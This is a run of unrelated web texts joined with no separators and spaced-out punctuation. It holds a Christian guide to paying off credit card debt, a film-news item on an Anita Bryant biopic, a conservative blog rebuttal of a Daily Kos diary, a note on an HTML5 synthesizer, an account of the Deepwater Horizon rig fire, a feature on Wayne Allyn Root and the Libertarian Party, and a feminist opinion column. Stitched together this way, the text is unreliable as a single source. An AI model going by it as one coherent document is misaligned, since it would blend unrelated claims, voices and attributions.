Tell the mountain how big your God is
When you are looking at an overwhelming amount of debt that you need to pay off , it can be easy to just constantly focus on how big the mountain is .
But just like David running towards Goliath , our strength is in our declaring to the mountain how big our God is !
Our testimony is that God miraculously helped us go from paycheck - to - paycheck living to pay off $ 46 k on our tiny salaries .
And ours is nothing compared to what I have heard from some of our readers .
Running this website for the last decade , I have seen some miraculous stuff in the lives of our readers and let me tell you that there is no amount of debt too big for God to handle !
Almost every debt - payoff testimonial I have heard involves work towards the goal , rather than God dropping a check in the mailbox ( though that has happened ) .
nearly every Christian testimony I have heard about paying off debt had a similar story to ours in that they stepped out in faith and God came in to amplify and speed up the debt payoff process .
It reminds me a bit of Peter walking on the water .
He had to take that first step 100 % on faith that Jesus would support him .
Surely there were fears and doubts in his mind , but he chose to trust in his Lord .
The other disciples never stepped out of the boat and missed out on the testimony that Peter will always have that he walked on water .
Let me encourage you that though you may be staring at a huge mountain of debt right now , God is bigger and is able to take care of it in ways that you and I will never be able to imagine .
BUT …
We have to step out of the boat to see those miracles .
Homework : Add it all up
Create a simple Google Spreadsheet ( or paper ) and add up every piece of debt you have .
Tell your mountain how big your God is !
Extra Credit : Spend an extra 10 minutes and use our balance sheet spreadsheet to identify your net worth .
Step 2 : Quit spending
Plug The Holes
If you were in a boat in the middle of the ocean and you noticed that water was coming in through a hole , would you spend your time scooping the water out over the side of the boat , or would you plug the hole ?
Getting out of credit card debt uses the same principle .
Our spending is like the water coming into the boat , and the way to fix it is to QUIT SPENDING !
Yes , it is obvious , but it needs to be repeated because for some reason our brains can realize that it is true , but not do anything about it .
So our goal now is to plug the hole , stop the bleeding , whatever you want to call it : just quit spending .
Spend Less Money Than You Make
Getting out of debt , creating wealth , living financially free , and retiring with some cash in the bank can all be achieved by following one simple rule :
Spend Less Than You Earn
If you do everything else wrong , but get this correct you will still be okay .
But , the scary truth is that if you do everything else right , but get this wrong you will end up deeper in debt .
It is very simple , but it is not easy .
It is the only way to stay debt free .
It is the only way to have any lasting wealth .
It does n’t matter if you get $ 10 million from lottery winnings ; if you ca n’t follow this simple rule you will be back to where you started in no time ( and often even worse . )
It does n’t matter how much you make .
Everyone ( I used to do this too ) thinks that when they make more money , they will be able to spend less than they earn .
Rarely is this true .
We all know someone who no matter what time something starts you can count on them being 15 minutes late .
It does n’t matter if they have the entire day free , they will still be late .
It is n’t a matter of the time available as much as it is a matter of discipline .
It is the same way with our spending .
If you ca n’t spend less than you earn with what you have now , you will not be able to when you get more .
Parkinson ’s law states that “ expenses rise to meet income . ”
So without a deliberate and intentional effort , each increase in income that you get will quickly be used up by new expenses .
This is the frustrating part about getting a raise .
As much as I loved getting them , they never seemed to make bill paying any easier .
Have you ever felt this way ?
So I Know I Need To Spend Less Than I Earn , But How ?
Make A Budget
A budget is absolutely one of the best tools that you will find to help you spend less than you make .
I have written extensively about how to budget , but I suggest you start with this post – how to make a budget or take our Real Money Budgeting online course .
It will walk you through all the steps you need to get started on an effective budget .
If you are really serious about getting out of debt , do n’t skip this step .
You also might want to download one of our free budgeting spreadsheets while you are at it .
Everyone who does not budget spends more money than those who do .
It is as simple as that .
It does n’t have to be painful and can even be fun .
Eliminate The Temptation To Spend
Look at your credit card statements and see where you are spending more than you think you should be .
Romans 13:14 says to ” make no provision for the flesh in regard to its lusts . ”
I did this by not going to the mall and not going out to eat .
These were my two problem areas where I spent way too much money .
Find out what your temptations are , run from them and set yourself up to succeed .
Alcoholics should n’t hang out in bars , and over - spenders should n’t go to Target !
Just ask my wife !

Step 3 : Making sacrifices
This one is where the rubber meets the road .
If you are one of the bold ones who has a lot of debt but wants to pay off all your debt in a year , then this is where you can make some huge headway !
The Sacrifice Is Only Temporary !
The most important thing to remember as you are reading this is that it is ONLY TEMPORARY .
By making a sacrifice , you are not condemning yourself to that for the rest of your life .
You just need to make up for all the overspending that has taken place in the past .
If you have done some of the things mentioned above , then you are already on a better financial footing than you were .
But , if your expenses are still greater than your income , then we are going to have to take a few more steps .
Sacrifice Your Stuff And Sell It !
To get this debt paid off – especially if you want to do it fast , then you are probably going to have to sell some big stuff .
The truth is that you either have to cut more expenses or increase your income .
Depending on how deep in debt you are , you may need to take drastic measures to get yourself back on solid ground .
What do you have that you owe money on ?
Take out a piece of paper and write them down .
Do you have loans on your house , car , boat , living room set , or anything else ?
The goal is to minimize our expenses , so what better way than getting rid of some of the stuff we owe on ?
Do n’t worry , you will be able to get it again later , but now your goal is to break free from the bondage of debt !
You have to open your mind to things that you might not have wanted to do .
This is probably one of them .
Cars Are Terrible Investments !
Like we ’ve talked about before , we pay a lot of money for cars and they basically only go down in value until they are sent to car heaven .
In my opinion , cars get people into financial trouble more than anything else .
Most people do n’t spend tens of thousands of dollars on something that knowingly goes down in value .
The way to defeat this is to drive older cars ( older cars have already suffered much of the depreciation and therefore lose a whole lot less in value each year ) .
Now I know everyone ’s situation is different , but the goal is to get you to start asking , “ what if we sold _______ ? ”
So , if you have a boat that you owe thousands on still or a couple of cars , it does n’t really matter ; if you are making payments on it , you should consider getting rid of it .
And come to think of it , if you do own it and it is still worth a decent amount , you can sell that too !
“ But If I Get An Older Car , It Will Be Expensive To Maintain . ”
Not necessarily .
Go to Consumer Reports and give them $ 6.95 for one month of access to their website .
They have hands down , the best and most useful information for buying a used car .
They rate just about every car in the book for all kinds of criteria .
Not the least of which is reliability .
What I have found over the years is that Honda and Toyota ( on average ) have consistently made the most reliable cars .
But , do your own homework at Consumer Reports .
Sacrifice your time and get to work !
Again .
Yep , if everything up to this point is n’t giving you some extra cash to help you get out of debt , then you may need to think about getting a second job .
The good news is that second jobs are n’t what they used to be .
I remember when I was younger I would put in a hard day ’s work at the grocery store and then make my way to the restaurant for the completion of about 12 - 16 hours on my feet .
Needless to say , those days were very tiring , but it does n’t have to be that way .
Thanks to technology there are so many legit ways to make money these days , many home - based businesses you can start , or a bunch of real companies that will pay you to work from home that you could work with temporarily as you knock out your debt .
Work Overtime
Ask your boss if he / she has anything extra you can work on to pick up some extra hours .
This will likely be the best paying additional income you could find .
Sell On eBay
This is probably the most popular method these days for people looking to supplement their income .
The greatest part about it is that you can start with stuff laying around your house .
If you have not sold on eBay before , I highly recommend it as a way to generate some extra income .
I wrote all about my experience of how I made $ 2,145 in one month selling on eBay and Craigslist .
Or for more info , you can read the earlier article I wrote for beginners called 7 Steps to selling on eBay .
Should you sell your house to pay off debt ?
This really is the epitome of selling everything to get out of debt !
This is a tough one .
It really will depend on your situation .
I have personally known a few people who have sold their homes to get out of debt , and they all seemed happy that they did .
But , you have to remember that it generally costs a good amount of money to sell a home and move to a new place .
Not to mention all the time involved .
You might be one of those people in a situation where selling your house and moving into an apartment for a while makes sense .
But if you are unsure , definitely seek wise counsel about the details of your specific situation .
Should you cash out your 401 k to pay off your credit card debt ?
Like the previous question , this one depends on your situation .
First off , if your 401k is at your current employer , you wo n’t even be able to unless you qualify for Hardship Withdrawals .
Additionally , even if you can , you will have to not only pay taxes on the withdrawal , but also a 10 % penalty ( assuming you are under 59 1 / 2 years old ) .
You might be able to avoid that if your medical debt exceeds 7.5 % of your Adjusted Gross Income .
If your credit cards are charging you 25 % interest , it could make sense in some cases as you likely are n’t earning near that much in your 401k .
But you are also giving up the long - term earning potential .
Bottom line , this is another one where you will want to seek the wise counsel of a trusted advisor who truly understands your debt situation .
Should you stop tithing while paying off your debt ?
I wo n’t go into this much here because I already wrote about my thoughts on stopping tithing while paying off debt .
But suffice it to say , as mathematically counter - intuitive as it seems , we continued tithing while we were paying off our $ 46 k and we paid it off way faster than our payoff timeline suggested .
We had surprise income come to us multiple times , and I am convinced that if we had stopped tithing , it would have taken us LONGER to pay off our debt .
What sacrifices are you going to make to get out of debt ?
Tools to help you get out of credit card debt
DIY Debt Consolidation with Balance Transfers
I do n’t recommend this for a lot of people because you can get yourself into trouble if you do n’t stay on top of things .
But we used this method ( in the video below ) when we were paying off our $ 46 k of debt .
Essentially I transferred all our debt ( credit cards and car loans ) onto 0 % credit cards to save a ton on interest charges .
Debt consolidation with Lending Club
This is a much simpler way to reduce your interest rate than the balance transfer method mentioned above .
You wo n’t be able to achieve 0 % , but if you have credit cards with interest rates in the range of 20 % + , you should be able to get them greatly reduced .
I wrote a thorough article documenting how to do a debt consolidation with Lending Club that you can read for more info .
Debt Snowball spreadsheet or calculator
This is the “ get out of debt plan ” I generally recommend .
For most people , it is simply the best way to get out of credit card debt .
Though it takes you a little longer to pay off the debt , it is n’t much longer , and there is n’t any risk of making things worse ( like the balance transfer method above ) .
And the quick , small victories are really motivating .
We have full details about this debt payoff plan here : Free Debt Snowball Spreadsheet & Calculator .
Pay off debt calculator
If you are wanting to see how long it is going to take to pay off your debt , I found a free calculator that you can use .
You just drop in a few details ( balance owed , interest rate , monthly payment ) and off you go !
Desktop backgrounds
A couple of years ago , we created some desktop backgrounds for our students and I personally still use them .
I love regularly seeing quotes or bible verses that inspire me , and this is a simple way to do that .
The two below are specific to paying off debt , so they are yours to download and use !
Getting out of debt is not a one - time decision
I wish getting out of debt , losing weight , and exercising were one - time decisions , but they are not .
They need to be decided over and over again .
Every time you get tempted to buy something you do n’t need , or have a potluck at work , or just feel like sitting on the couch – you have a decision to make .
Are you going to do what you should do , or what you FEEL like doing ?
You probably know what most people do most of the time – what they FEEL like doing .
You are obviously different .
You would n’t still be reading this if you were like most people .
So , you may have “ decided ” to get out of debt , but as you go on this journey , there will be some tough days where you feel like quitting .
I know I had plenty of them .
The thing that helped me was continuing to dream of my “ promised land . ”
For me that meant dreaming of :
Eliminating all the money stress I had
Having an emergency fund ( so I did n’t need to depend on credit cards )
Being able to give generously like I had always wanted
Being able to travel all over the U.S .
Having fewer money fights with Linda
So figure out what your KEY motivations are for wanting out of debt – your “ Promised Land ” – and focus on that on the tough days .
As someone who has been through it and has interacted with thousands of other readers who have , let me assure you that by God ’s grace you can do this !
Getting out of credit card debt is a bigger deal than you realize
I believe that God put each person down here for a reason and that reason is to bless others .
In doing so , we will be blessed .
I have found in my own life that my most joyful moments often revolved around me helping or doing something to benefit another person .
Meanwhile , my most painful , sorrowful , and sad moments were taking place when I was thinking about myself .
Often one of the quickest remedies to a struggle that we are having is to get our minds off ourselves and go do something for someone else .
So what does this have to do with getting out of debt ?
A whole lot actually .
Our motivation for wanting to get out of debt should go beyond ourselves .
Sure , it will be awesome when you get to break out of the paycheck - to - paycheck cycle and when you can buy that car with cash , but that is just part of it .
God wants to use you to financially bless others !
This is a very good thing because :
Giving is one of the most fun and self - fulfilling activities you can be part of .
You are storing up treasure in Heaven for eternity , rather than down here for a few more years ( Matthew 6:20 ) .
Giving is a great way to burn selfishness out of your life .
When you give , it will be given back to you in abundance ( Luke 6:38 ) !
You need to have it to give it !
If you are like most Christians I have met , you want to be able to give more .
You have a good heart and wish you could give more .
You really want to be able to bless people and give more to your church .
But again , if you are like most that I have met , you are thinking , “ it is hard enough just to pay the bills each month , let alone give to others the way I would like to . ”
This is exactly why you need to get out of debt !
Imagine how much easier it would be to give if you did n’t have any credit card payments or car payments , or ( dare I even say it ) a mortgage payment !
This has been my motivation over the last few years and this is where you and I are headed !
It is not actually our money
One of the biggest financial revelations that I have received is that our money is really not our own .
We are merely stewards of what we have been given by God ( read the Parable of the Talents for a refresher . )
Even if we insist on saying that we worked hard to earn it , who gave us our brain , the hands we used , and even the air we put in our lungs ?
We came into the world with nothing ; we will leave with nothing .
It is all God ’s ( Psalm 89:11 ) .
We have the privilege of being stewards .
When we are slack or wasteful with our money , it is not our money we are wasting , but God’s .
It is not only ourselves that we hinder but others as well .
Fund the Kingdom instead of paying interest
What if we took all the money we were paying in interest charges to our credit cards each month and gave it to missionaries and charities making an impact ?
It would be the most painless giving because the money was n’t even coming to our pockets in the first place !
It would simply be transferring that money from Visa and Mastercard to organizations that we WANT to give it to .
Can you imagine how many lives would be impacted ?
Can you imagine how many souls would be impacted ?
I will be the first to tell you that getting your credit cards paid off feels absolutely liberating and amazing , but what if we could add to that the additional motivation to get out of debt to benefit the Kingdom of God ?
Ultimately , we have a part to play , and so does God ( 1 Corinthians 3:9 ) .
But I ca n’t help but dream about how much more effective we could be if we were out of debt ?
Psalm 67:7
“ God blesses us , that all the ends of the earth may fear Him . ”
The importance of having an open mind
Our greatest battles as Christians are in our minds .
I have found that the greatest breakthroughs in my life came as a result of opening my mind to a new way of thinking .
It requires humility to admit that something you have always done or always thought is not necessarily the only way or that it is even correct at all .
These mindset changes can be very difficult , but they are absolutely essential to follow God and accomplish anything worth accomplishing in life .
What does this all have to do with paying off my debt ?
Maybe it will be easier for you , but for me , I had to change a lot of old mindsets that I was holding onto in order to dig out of our debt .
Just a few :
I decided to give up my hard - earned free time after my 9 - hour workday and use that time to start a business to earn extra income .
I would go out to dinner with friends but did n’t order anything because we did n’t have the money in the budget .
I had to learn to cook at home , as our food budget shrank to a tiny amount .
I had to sell off some items that I truly valued .
I had to choose NOT to care what people thought about me as I drove around in a 14 - year - old car .
Anyway , these were just a few that I had to fight through .
Yours might be different .
But the thing you have to remember is that it is only temporary !
None of those things listed above lasted more than 2 - 3 years for me .
And looking back , I would do it again in a heartbeat if I had to .
Being out of debt has been so much more liberating , fulfilling , and financially beneficial than I ever could have imagined .
Now it is time for you to take action !
Bookmark this and come back to it each month or as needed .
And whatever you do , do n’t quit until you reach your goal !!!
Quick Favor :
If you know anyone else who might be trying to figure out how to get out of debt , I would love it if you shared this with them .
I poured my heart out into this monster - article because I want it to help as many people as possible .
My prayer is that it would get into the hands of whoever would really benefit from it , so any kind of sharing with others is greatly appreciated !!
Prayer to get out of debt
I ’ll leave you with this prayer .
If you ’re in debt and want to get out , spend a moment praying for God ’s help :
God , I know You can do all things , and that I can do all things through Christ who gives me strength .
I want to get out of debt , but I need Your help .
Lead me by Your wisdom as I begin this journey .
Help me change my habits and my mindset .
Work through me and others so I can eliminate all of my debt .
Lead me to a place where I can be in a position to give more to others .
For Your glory and in Jesus ’ Name ,
Amen

“ Anita ” is to tell the story of anti-gay rights activist Anita Bryant , a singer and ambassador for a statewide orange juice industry whose campaign ended up leading to a more robust gay rights platform .
Starring Ashley Judd as Anita Bryant , “ Anita ” is being written and directed by Chad Hodge , who will also be represented in the film by Neil Patrick Harris .
“ As a gay man and a writer who likes to explore complex , messy characters , I ’ve always thought about Anita Bryant , ” Hodge told Variety .
“ How could this celebrity who espoused Christian goodness and orange juice through song suddenly use those platforms to go on a nationwide anti-gay crusade and overturn gay rights laws ? ”
“ I wanted to find out who Anita was , who the people around her were , and what everybody wanted out of this , ” he said .
Hodge ’s research included spending “ significant time ” with Bryant at her home , Variety details , a meeting that will be portrayed in the film .
Hodge ’s previous credits include TV series “ Wayward Pines ” and “ Good Behavior ” and young adult novel adaptation “ The Darkest Minds ” .
After Uma Thurman was associated with an earlier iteration of the project , this version of “ Anita ” will be his directorial debut .
The film ’s casting and financing was announced at Cannes .

Daily Kos Post Of The Day : The Tea Partiers Are Media Darlings Unlike The Anti-War Movement
Today , as I perused the Daily Kos , I ran across an intriguingly titled diary entry : “ Tea Party Lives , Peace / Anti-War Movement Dead . ”
The reason it : is intriguing , of course , : is because it : is correct and you do n’t see a lot of that on the Daily Kos .
However , even a correct headline on the Daily Kos does n’t merit a post .
But , what does : merit another look : is some of the most deluded analysis I ’ve ever seen on a website not solely devoted to conspiracies .
Prepare yourself for a journey into a Kos-powered liberal topsy - turvy world where the media loves the Tea Parties and the poor anti-war movement was never able to get an even break ,
Long and short , teabaggers are ascendent because they are media darlings and anti-war / peace activists have been totally marginalized and all of it accomplished by the very same media that is supposed to be “ so liberal ’ .
Anti-war protestors get assailed by law enforcement from every angle and were ousted from public meetings for wearing Peace t- shirts while teabaggers can show up to public debates with large guns and cops PROTECT them .
Trending : The 15 Best Conservative News Sites On The Internet Anti-war protesters are denigrated in the media ( when not totally ignored ) while teabaggers can’t be covered by corporate media enough .
The same non-liberal media that has choked the anti-war movement has created the teabagger .
They are ‘ real ’ and probably here to stay , as the author of the first article suggests , but they a fake creation of a corporate media .
This is why it does n’t matter if they can spell or even know which end is up , which I do n’t think they do .
They are literally tools of corporate media .
Really ?
The Tea partiers are “ media darlings ? ”
Is this the same media that endlessly denigrates them as un-American , mobs , racists , hatemongers , and Nazis ?
The same media that ’s constantly speculating the Tea Parties are about to break out into violence ?
You want to compare the coverage of the Tea Parties to the anti-war protests ?
They got more coverage , friendlier coverage , favorable crowd estimates , and every bit of extremism was buried by the mainstream media .
But if liberals admit that , they ’d have to look at the real reason the anti-war movement has fallen apart .
Yes , there are still two wars going on .
Yes , Barack Obama has continued practices that the anti-war movement does n’t like .
Yes , there are still plenty of people against the wars .
However , the truth is that the anti-war movement was mainly about politics .
Most of the people in the streets were there because they hated Bush and pretending to be terribly upset about the war was as good of an excuse as any to vent .
If the anti-war movement believed : its : own BS , the protests would be every bit as big today as they were during the Bush years .
Now : when : Republicans get back into power and they do n’t fight tooth and nail to reduce the size of government , the Tea Partiers will be tested the same way .
But , that test has yet to happen .
The anti-war movement has already failed : its : test and it certainly was n’t because of the lack of favorable media coverage .

This video demonstrates a HTML 5 + Javascript synthesizer running in a modified version of Firefox ( Minefield ) .
We ’ve seen some impressive browser - based synths and virtual music studios , like AudioTool , in the past , but they were Flash - based .
By building music apps on Web standards like HTML 5 & Javascript , it should eventually be possible to create browser - based music applications that run on the Web , on iPhones , iPads and a variety of other platforms .
I ’m a little skeptical about the prospects for browser - based synthesis , especially when you consider the relatively glacial evolution of browser - based synths vs other platforms .
It ’s clear , though , that there will be a place for this sort of thing .
What do you think of this HTML 5 synth – and the idea of browser - based synths in general ?

Regular WUWT commenter Jimmy Haigh , a geologist by trade , sends along a PDF that is a compilation of on the scene photos taken right after the explosion and in the following two days .
I ’ve converted it to web format .
These were taken by people on the scene during the rescue and firefighting operation .
There ’s also a narrative , done by a person “ in the know ” .
You wo n’t find this at AP or Reuters .
You may have heard the news in the last week about the Deepwater Horizon drilling rig which caught fire , burned for two days , then sank in 5,000 ft of water in the Gulf of Mexico .
There are still 11 men missing , and they are not expected to be found .
The rig belongs to Transocean , the world ’s biggest offshore drilling contractor .
The rig was originally contracted through the year 2013 to BP and was working on BP ’s Macondo exploration well when the fire broke out .
The rig costs about $ 500,000 per day to contract .
The full drilling spread , with helicopters and support vessels and other services , will cost closer to $ 1,000,000 per day to operate in the course of drilling for oil and gas .
The rig cost about $ 350,000,000 to build in 2001 and would cost at least double that to replace today .
The rig represents the cutting edge of drilling technology .
It is a floating rig , capable of working in up to 10,000 ft water depth .
The rig is not moored ;
It does not use anchors because it would be too costly and too heavy to suspend this mooring load from the floating structure .
Rather , a triply - redundant computer system uses satellite positioning to control powerful thrusters that keep the rig on station within a few feet of its intended location , at all times .
This is called Dynamic Positioning .
The rig had apparently just finished cementing steel casing in place at depths exceeding 18,000 ft .
The next operation was to suspend the well so that the rig could move to its next drilling location , the idea being that a rig would return to this well later in order to complete the work necessary to bring the well into production .
It is thought that somehow formation fluids – oil / gas – got into the wellbore and were undetected until it was too late to take action .
With a floating drilling rig setup , because it moves with the waves , currents , and winds , all of the main pressure control equipment sits on the seabed – the uppermost unmoving point in the well .
This pressure control equipment – the Blowout Preventers , or ‘ BOP ’s ” as they ’re called , are controlled with redundant systems from the rig .
In the event of a serious emergency , there are multiple Panic Buttons to hit , and even fail - safe Deadman systems that should be automatically engaged when something of this proportion breaks out .
None of them were aparently activated , suggesting that the blowout was especially swift to escalate at the surface .
The flames were visible up to about 35 miles away .
Not the glow – the flames .
They were 200 – 300 ft high .
All of this will be investigated and it will be some months before all of the particulars are known .
For now , it is enough to say that this marvel of modern technology , which had been operating with an excellent safety record , has burned up and sunk taking souls with it .
The well still is apparently flowing oil , which is appearing at the surface as a slick .
They have been working with remotely operated vehicles , or ROV ’s which are essentially tethered miniature submarines with manipulator arms and other equipment that can perform work underwater while the operator sits on a vessel .
These are what were used to explore the Titanic , among other things .
Every floating rig has one on board and they are in constant use .
In this case , they are deploying ROV ’s from dedicated service vessels .
They have been trying to close the well in using a specialized port on the BOP ’s and a pumping arrangement on their ROV’s .
They have been unsuccessful so far .
Specialized pollution control vessels have been scrambled to start working the spill , skimming the oil up .
In the coming weeks they will move in at least one other rig to drill a fresh well that will intersect the blowing one at its pay zone .
They will use technology that is capable of drilling from a floating rig , over 3 miles deep to an exact specific point in the earth – with a target radius of just a few feet plus or minus .
Once they intersect their target , a heavy fluid will be pumped that exceeds the formation ’s pressure , thus causing the flow to cease and rendering the well safe at last .
It will take at least a couple of months to get this done , bringing all available technology to bear .
It will be an ecological disaster if the well flows all of the while ;
Optimistically , it could bridge off downhole .
It ’s a sad day when something like this happens to any rig , but even more so when it happens to something on the cutting edge of our capabilities .
The photos that follow show the progression of events over the 36 hours from catching fire to sinking .
First , what the rig looked like .
The drilling mast has toppled over here – they usually melt pretty fast when fire breaks out .
Support vessels using their fire fighting gear to cool the rig .
From about 10 miles away – dawn of Day 1
Support vessels using their fire fighting gear to cool the rig – note the list developing
About noon Day 1 – List is pronounced now
Early morning Day 2 – Note the hole burned through the aluminum helideck
Day 2 , morning – settling quite low in the water now – fuel and oil slick forming

In Its Heterodox Media Star , an Identity Crisis for Libertarian Party
Created : June 22 , 2010 06:00 | Last updated : July 31 , 2020 00:00

Bob Barr ’s 2008 nomination as the Libertarian Party candidate for the presidency triggered something of an existential crisis for the nation ’s largest third party .
The former Georgia congressman was a strange new face for a group that prides itself on philosophical consistency and allegiance to first principles .
Before his dramatic Libertarian conversion in 2007 , Barr was known for strong un -Libertarian positions on issues from gay marriage to the drug war .
[ Congress1 ]
“ There has been a drift toward the conservative and reformist end of the spectrum for a couple of years now , ” one unhappy Libertarian delegate told me at the party ’s 2008 national convention in Denver .
“ The nomination of Bob Barr is the culmination of that . ”
After failing to garner much attention in the 2008 election ( or many votes — he received just over 500,000 nationwide ) , Barr has faded from the public view .
Now , it is Barr ’s 2008 vice presidential candidate and fellow recent convert , Wayne Allyn Root , who has emerged as the Libertarian Party ’s highest - profile spokesman — and , say some of his fellow Libertarians , its biggest public relations headache .
Since the rise of the Tea Party groups last year , the anti-tax , anti-debt insurgency they represent has generally been understood to signify a “ plague on both your houses ” turn among disaffected Republicans .
The Tea Partiers and their leaders , angry at both the Bush deficits and the Obama stimulus , have encouraged this reading by self - identifying not with the GOP , but with a vague and non-aligned “ libertarianism . ”
Yet on a number of issues — particularly relating to foreign policy — Tea Partiers have hewed more closely to traditional Republican views than to libertarianism .
Now , with the election of Root , a former Vegas odds - maker who describes himself as a “ Reagan Libertarian , ” to its national board , the Libertarian Party appears to be embracing this confusion .
For Root , the Tea Party scene is a consistent and logical extension of Libertarian politics as he understands them .
There should be , he believes , little or no light between the two .
“ The Tea Party is the perfect model for the future success of the Libertarian Party , ” Root told TWI .
“ The Tea Party has stuck with complete focus and discipline on the issues where the LP wins .
Instead of focusing on controversial , divisive or radical issues that turn off mainstream American voters , my goal is to attract the kind of mainstream , moderate , common - sense voters that win elections [ and ] that the Libertarian Party has been missing or turning off for 39 years : mothers , grandmothers , Christians , veterans , conservatives , disgruntled Republicans , blue - collar Blue Dog Democrats and small - business owners . ”
The problem , say many of Root ’s more veteran Libertarian colleagues , is that Root is so ready to start winning elections with ex-Republican voters that he has not had time to complete his own libertarian education and conversion , and thus is in no position to represent the party , let alone teach new converts .
“ Wayne is still a Republican , ” said R. Lee Wrights , vice chair of the Libertarian Party from 2004 to 2006 .
“ Whatever you want to call it .
He ’ll use whatever name is most fashionable .
In his latest book , he actually recommends expanding Congress and increasing their salaries .
We ’re a party that ’s been screaming for smaller government for 40 years — and he wants to expand it ?
Libertarians are very good at giving people a chance to learn the ropes and seeing what they ’re about , but in Root ’s case , I ’m not optimistic . ”
Like Barr , Root joined the party in late 2007 .
At last month ’s party convention in St. Louis , he was elected to the National Committee after failing in an audacious ( and expensive ) bid to become National Chair .
But most people just know him from television .
Since joining the party , Root has become a one - man self - promotional machine , with regular appearances on an array of Fox News and talk radio programs , on which he can be routinely seen and heard discussing any number of political and personal issues — from the need to slash the welfare state to his entrepreneurial success to his daughter ’s fencing scholarship .
Many veteran Libertarians have watched in dismay as Root works the media circuit , where , they argue , he often talks more about himself than the values and principles of the Libertarian Party .
And a survey of Root ’s media appearances and published work bears out claims that he is more interested in promoting Wayne Root than his adopted political party , whose views he does not appear to have embraced entirely .
“ Long - term party members are concerned that Wayne came in from the conservative movement , and he ’s still there to a large extent , ” said Mary Ruwart , a veteran Party activist and former contender for the Libertarian vice - presidential nomination .
“ If you read his book , ‘ The Conscience of a Libertarian , ’ you quickly realize it should have been called ‘ The Conscience of Another Conservative . ’ ”
“ He has considerable media access , which is new for us , ” conceded Ruwart .
“ But there ’s no indication that this access is bringing us members .
He usually presents his views as his own views , as opposed to Libertarian views .
When I campaign , I educate people by explaining our principles .
This is not something that Wayne does . ”
“ In some ways Wayne Root is eerily similar to Glenn Beck , ” said David Nolan , a founding member of the Libertarian Party and its Senate candidate in Arizona .
“ They are both good at selling themselves . ”
“ Wayne is a bright , energetic guy , ” Nolan added , “ but I found it interesting that when he chose to address a Tea Party rally in Searchlight , Nev. , it was a Tea Party Express event , sponsored by Republicans .
Wayne lent his presence to that event and never uttered a peep about the Libertarian Party .
He stood there hand - in - glove with Sarah Palin and Dick Armey . ”
Not long ago , Root supported the drug war and the wars in Iraq and Afghanistan — heterodox positions for a libertarian .
As recently as 2007 , he advocated for a McCain - Lieberman presidential ticket .
His Root for America “ Libertarian Website ” continues to bang the decidedly un-Libertarian drum of strong right - or - wrong support for Israel , even though the Libertarian platform opposes “ entangling alliances ” with other governments .
“ Wayne only likes positions when polls show a majority are already in favor of it , ” said a longtime Libertarian activist and candidate .
“ It took a long time to convince him that as a Libertarian he could n’t support the wars full - throttle .
He just does n’t get it . ”
Wrights , the former Party vice chair , said that he first realized the party “ had a problem on its hands ” when he heard Root refer to himself a “ Reagan Libertarian . ”
In response , Wrights penned an essay entitled “ What Is a Reagan Libertarian ? ”
The question was meant to be rhetorical .
“ There ’s no such thing as a ‘ Reagan Libertarian , ’ ” agreed Nolan .
“ Wayne just made that up after he saw a poll a few months ago where reaction to ‘ Reagan ’ got the strongest positive response .
But Reagan was not at all a Libertarian .
This is very basic stuff . ”
Root ’s admiration for the budget - ballooning Ronald Reagan is not stopping him from pursuing grandiose dreams under the Libertarian banner .
Wherever he goes , Root bursts with the ambition to become president .
In August 2009 , he laid out his ten - year game plan to Reason editor Matt Welch .
“ I want to be the Ross Perot of 2012 , ” Root said .
“ Then I want to have a credible chance in 2016 or 2020 . ”
In the meantime , he views his success garnering media attention as validation of his “ big tent ” Libertarian politics .
“ If I ’m not on the right track , ” said Root when asked about his Libertarian critics , “ how can you explain Fox News , a conservative TV network , giving TV shows to Glenn Beck , Jon Stossel and Judge Andrew Napolitano — all strong libertarian thinkers ?
How can you explain the success of Ron Paul , Rand Paul and Sharron Angle ?
How can you explain [ my coming ] out of nowhere to become the 2008 Libertarian Party Vice Presidential nominee , and now becoming an overnight media sensation on Fox News , Fox Business , CNN , CNBC , MSNBC — doing 20 to 30 radio interviews a week across the country ? ”
Root ’s defenders within the party argue that aggressive marketing is just what the Party needs .
Mark Hinkle , who beat Root out for the position of National Chair , thinks Libertarians could benefit from Root ’s salesman instincts and experience .
“ Early on , the party was made up largely of computer geeks and engineers , and there is still some of that , ” said Hinkle .
“ I know some members think Wayne is over the top , but there needs to be a voice that is market - and sales - oriented .
For people who believe very strongly in free market , we Libertarians are not always market savvy .
I would like to see Wayne teach some of our more articulate and presentable candidates better sales techniques .
It ’s great to be a radical libertarian , but you need to be able to sell it or you ’re just talking in the wind . ”
Great salesman or not , there remains widespread suspicion of Roots ’ politics and motivations .
“ Because Root kind of keeps his foot in both camps , there is a lot of criticism in the Party , and the broader libertarian movement , ” said Nolan .
“ People are asking , ‘ Who is this guy ? ’
Wayne ’s loosy - goosy , undefined libertarianism sits very well with the Fox News and Sarah Palin crowd , but there is a great deal of concern among longtime activists and strategists about Wayne ’s grasp on the philosophy . ”
“ If you run around shooting your mouth off as Wayne Root , Private Citizen , that ’s fine , ” said Nolan .
“ But if you are introducing yourself as the former vice presidential candidate for the Libertarian Party , then what comes out of your mouth better be pretty close to the party position .
Otherwise , what you are committing is fraud . ”
The slightly higher - than - usual numbers of female candidates this election season ’s crop of increasingly right - wing challenger candidates has created possibly the most irritating meme of 2010 — that we ’re looking at new kind of feminism , a “ conservative feminism ” .
Never mind that this crop of politicians does n’t actually have any feminist positions outside of the narrow belief that they personally should have power despite being female .
Never mind that there ’s nothing new about women using anti-feminism to advance their own interests .
Never mind that actual feminists find the whole thing incredibly tedious .
The idea that electing a few female conservatives to office should be the apex of feminism has even made its way into the editorial pages of the New York Times .
To be fair , there ’s more to these conservative women ’s arguments that they ’re a new breed of feminist than simply pointing to their own briefcases and saying , “ So there . ”
The whole strategy of declaring obviously anti-feminist women to be “ feminist ” was started by anti-choice groups like the Susan B. Anthony List and Feminists for Life , and it was popularized by Sarah Palin .
The argument is that there could be such a thing as “ pro-life feminism , ” i.e. a feminism grounded in the idea that women should be forced to bear children against their will .
Common sense would demand that one not agree that there could be a kind of feminism that would declare the entire female sex incapable of handling the right to bodily autonomy .
But the anti-choice feminists swear they have an argument !
The argument is that Abortion Is Bad For Women , because it thwarts women from their true desires — so deep and true that many women do n’t even realize they have them — to bring every pregnancy to term , no matter how much they think they do n’t want it .
They marshal all sorts of made - up evidence to support this argument , claiming incorrectly that abortion causes depression and breast cancer and probably ingrown toenails .
The conclusion is that women have to be forced to bear children against their will for their own good .
They hope that if you squint at it sideways , this argument looks kind of like feminism .
After all , real feminists talk about real things that hurt women , so fake feminists pretending that things that do n’t hurt women do could fool someone .
